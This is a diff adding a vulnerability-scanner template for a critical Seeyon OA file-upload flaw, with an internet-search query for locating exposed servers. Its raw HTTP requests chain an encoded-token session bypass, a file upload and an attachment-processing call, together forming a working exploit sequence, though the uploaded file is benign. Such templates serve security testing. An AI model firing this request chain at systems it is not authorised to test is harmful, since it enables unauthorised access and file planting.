@@ -1,0 +1,95 @@
+id: seeyon-oa-thirdpartycontroller-file-upload
+
+info:
+  name: Seeyon OA ajax File Upload
+  author: zp857
+  severity: critical
+  reference: https://moresec.yuque.com/iixlqz/wnv3e6/hx1eyd
+  tags: seeyon-oa,fileupload
+  metadata:
+    fofa-query: 'app="致远互联-OA" || app="Seeyon-Server"|| app="用友-致远OA" || (server="Seeyon-Server") || (body="/seeyon/USER-DATA/IMAGES/LOGIN/login.gif" || title="用友致远A" || body="/yyoa/" || header="path=/yyoa" || server=="SY8044" || (body="A6-V5企业版" && body="seeyon" && body="seeyonProductId") || (body="/seeyon/common/") || (body="A8-V5企业版" && body="/seeyon/"))'
+
+requests:
+  - raw:
+      - |
+        POST /seeyon/thirdpartyController.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1
+
+      - |
+        POST /seeyon/fileUpload.do?method=processUpload HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: {{cookie}}
+        Content-Type: multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b
+
+        --59229605f98b8cf290a7b8908b34616b
+        Content-Disposition: form-data; name="firstSave"
+
+        true
+        --59229605f98b8cf290a7b8908b34616b
+        Content-Disposition: form-data; name="callMethod"
+
+        resizeLayout
+        --59229605f98b8cf290a7b8908b34616b
+        Content-Disposition: form-data; name="isEncrypt"
+
+        0
+        --59229605f98b8cf290a7b8908b34616b
+        Content-Disposition: form-data; name="takeOver"
+
+        false
+        --59229605f98b8cf290a7b8908b34616b
+        Content-Disposition: form-data; name="type"
+
+        0
+        --59229605f98b8cf290a7b8908b34616b
+        Content-Disposition: form-data; name="file1"; filename="11.png"
+        Content-Type: image/png
+
+        111
+        --59229605f98b8cf290a7b8908b34616b--
+
+      - |
+        POST /seeyon/ajax.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: {{cookie}}
+
+        method=ajaxAction&managerName=portalDesignerManager&managerMethod=uploadPageLayoutAttachment&arguments=[0,"{{date}}","{{fileurls}}"]
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '"message":"archive is not a ZIP archive"'
+
+      - type: status
+        status:
+          - 500
+
+    extractors:
+      - type: regex
+        name: cookie
+        group: 1
+        internal: true
+        part: header
+        regex:
+          - 'Set-Cookie: (.*?);'
+
+      - type: regex
+        name: fileurls
+        group: 1
+        part: body
+        internal: true
+        regex:
+          - fileurls\+","\+'(.*?)'
+
+      - type: regex
+        name: date
+        group: 1
+        part: body
+        internal: true
+        regex:
+          - 11.png", ".*?", "(.*?)"
